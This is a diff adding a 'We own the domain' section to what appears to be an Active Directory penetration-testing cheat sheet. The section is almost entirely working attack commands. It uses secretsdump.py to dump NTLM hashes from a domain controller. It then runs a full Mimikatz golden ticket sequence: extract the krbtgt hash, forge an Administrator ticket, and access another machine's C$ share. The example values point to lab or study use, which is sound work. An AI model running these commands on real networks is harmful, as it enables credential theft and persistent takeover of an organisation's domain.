@@ -337,3 +337,31 @@ use auxiliary/smb_enum_gpp
 # tool is default in kali
 gpp-decrypt <PASSWORD>
 ```
+
+# We own the domain - Now What?
+## Dumping NTDS.dit database
+```bash
+secretsdump.py test.local\fcastle:Password1@192.168.5.2 -just-dc-ntlm 
+```
+
+## Golden Ticket
+<p>We are using Mimikatz for this step.</p>
+
+```bash
+privilege::debug
+
+# pull down the user we want
+lsadump::lsa /inject /name:krbtgt
+
+# Now create the golden ticket:
+# we need following information from the output:
+# SID of the domain
+# NTLM hash of the krbtgt account
+kerberos::golden /User:Administrator /domain:KRUEMEL.keks /sid:S-1-5-21-3311685201-1443070845-3622335404 /krbtgt:3f5f8a614cf590401df166f81b87bf17 /id:500 /ptt
+
+# next we want the golden ticket cmd
+misc::cmd
+
+# now check our privileges, with accessing another machine
+dir \\Client-01\c$
+```
